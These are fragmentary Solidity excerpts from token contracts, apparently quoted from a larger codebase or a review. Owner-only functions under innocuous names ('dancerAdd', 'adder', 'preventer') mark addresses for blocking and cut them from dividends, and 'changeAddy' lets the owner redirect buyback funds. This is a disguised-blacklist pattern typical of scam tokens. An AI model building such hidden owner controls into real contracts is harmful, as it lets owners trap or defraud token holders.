...
//        require(!inSwap, "Try again");
    ...
    function dancerAdd(address _addr) public onlyOwner {
        dancer.adder(_addr);
        rewardsTracker.excludeFromDividends(_addr);
    }
    ...
    function _transfer(
        ...
        if (!beginningOn && !swapping && tradingIsEnabled && from != presaleWallet &&
...
contract DancerContract is Ownable {
    ...
    address public marketingWallet = 0xc03d21906f85dbaBE76a8247317F046ccE81d249;
    ...
    function adder(address _addr) external onlyOwner {
        preventer[_addr] = true;
    }

    function statusFind(address _addr) external view onlyOwner returns (bool) {
        return preventer[_addr];
    }
...
contract CocktailBuyBack is Ownable {
    ...
    function changeAddy(address _addr) onlyOwner public {
        toAddy = _addr;
    }
